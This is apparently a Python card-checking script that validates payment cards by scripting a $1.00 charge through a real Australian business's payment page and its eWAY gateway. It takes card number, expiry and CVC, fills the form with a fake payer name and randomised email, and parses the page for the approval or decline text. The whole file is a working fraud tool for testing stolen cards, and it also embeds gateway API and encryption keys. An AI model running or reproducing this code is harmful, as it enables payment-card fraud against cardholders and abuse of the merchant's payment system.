import requests,re
import random
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'www.katieroberts.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	        
	response = requests.get('https://www.katieroberts.com.au/payments/', headers=headers)
	        
	csrf = re.search(r'name="csrf" value="(.*?)"', response.text).group(1)
	#print(csrf)
	        
	headers = {
	    'authority': 'www.katieroberts.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.katieroberts.com.au',
	    'referer': 'https://www.katieroberts.com.au/payments/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	        
	params = {
	    'action': 'payment',
	}
	        
	data = {
	    'title': 'Payment',
	    'csrf': f'{csrf}',
	    'csrf-hp': '',
	    'krccYfdjk_adlPH': '',
	    'krccFJK_FHPC': '',
	    'krccFirstName': 'Rodam',
	    'krccLastName': 'User',
	    'krccBehalfOf': '',
	    'krccEmail': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	    'serviceType[]': 'JSC',
	    'krccOtherService': '',
	    'krccAmount': '1.00',
	}
	        
	response = requests.post('https://www.katieroberts.com.au/payments/', params=params, headers=headers, data=data)
	        
	AccessCode = re.search(r"var mpAccessCode = '(.*?)'", response.text).group(1)
	#print(AccessCode)
	        
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'Origin': 'https://secure.ewaypayments.com',
	    'Referer': f'https://secure.ewaypayments.com/sharedpage/sharedpayment?AccessCode={AccessCode}',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	        
	data = {
	    'EWAY_ACCESSCODE': f'{AccessCode}',
	    'EWAY_ISSHAREDPAYMENT': 'true',
	    'EWAY_APPLYSURCHARGE': 'true',
	    'AMEXEC_ENCRYPTED_DATA': '',
	    'EWAY_CUSTOMERREADONLY': 'True',
	    'VISA_CHECKOUT_APIKEY': 'ME3VTMA94JVB2C5TDJ5X21w9TZo5QjaHuIis_MwMtFASXTFog',
	    'VISA_CHECKOUT_ENCRYPTIONKEY': '6ADOIUMA6MPQI2I7WXGQ14FrJpwQ1xXQkiI-IScww7yu-hvtA',
	    'FLAG_SHOW_SHIPADDR': 'False',
	    'FLAG_SHOW_CUSTADDR': 'True',
	    'FLAG_SHOW_SHIPPINGDETAILS': 'True',
	    'PAYMENT_TRANTYPE': 'Purchase',
	    'APPLEPAY_NETWORKTOKEN': '',
	    'EWAY_GOOGLEPAY_NETWORKTOKEN': '',
	    'EWAY_CUSTOMERFIRSTNAME': 'Rodam',
	    'EWAY_CUSTOMERLASTNAME': 'User',
	    'EWAY_CUSTOMEREMAIL': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	    'EWAY_CUSTOMERSTREET1': '',
	    'EWAY_CUSTOMERSTREET2': '',
	    'EWAY_CUSTOMERCITY': '',
	    'Customer.Country': 'AU',
	    'Customer.State.dropbox': 'ACT',
	    'Customer.State.textbox': '',
	    'EWAY_CUSTOMERPOSTALCODE': '',
	    'EWAY_CUSTOMERPHONE': '',
	    'EWAY_SHIPPINGFIRSTNAME': '',
	    'EWAY_SHIPPINGLASTNAME': '',
	    'EWAY_SHIPPINGEMAIL': '',
	    'EWAY_SHIPPINGSTREET1': '',
	    'EWAY_SHIPPINGSTREET2': '',
	    'EWAY_SHIPPINGCITY': '',
	    'ShippingAddress.Country': '',
	    'ShippingAddress.State.dropbox': 'ACT',
	    'ShippingAddress.State.textbox': '',
	    'EWAY_SHIPPINGPOSTALCODE': '',
	    'EWAY_SHIPPINGPHONE': '',
	    'EWAY_CARDNUMBER': f'{n}',
	    'EWAY_CARDNAME': 'Dao Khao Saard',
	    'EWAY_CARDEXPIRYMONTH': f'{mm}',
	    'EWAY_CARDEXPIRYYEAR': f'{yy}',
	    'EWAY_CARDCVN': f'{cvc}',
	}
	        
	response = requests.post(
	    'https://secure.ewaypayments.com/sharedpage/SharedPayment/ProcessPayment',
	    headers=headers,
	    data=data,
	)
	        
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'Connection': 'keep-alive',
	    'Referer': f'https://secure.ewaypayments.com/sharedpage/sharedpayment?AccessCode={AccessCode}',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	        
	params = {
	    'AccessCode': f'{AccessCode}',
	}
	        
	response = requests.get(
	    'https://secure.ewaypayments.com/sharedpage/sharedpayment/Result',
	    params=params,
	    headers=headers,
	)
	        
	headers = {
	    'authority': 'www.katieroberts.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'referer': 'https://secure.ewaypayments.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	        
	params = {
	    'action': 'response',
	    'AccessCode': f'{AccessCode}',
	}
	        
	response = requests.get('https://www.katieroberts.com.au/payments/', params=params, headers=headers)
	        
	result = re.search(r'<h2 class="padding_L_20px padding_B_25px">(.*?)</h2>', response.text).group(1)
	return (result)
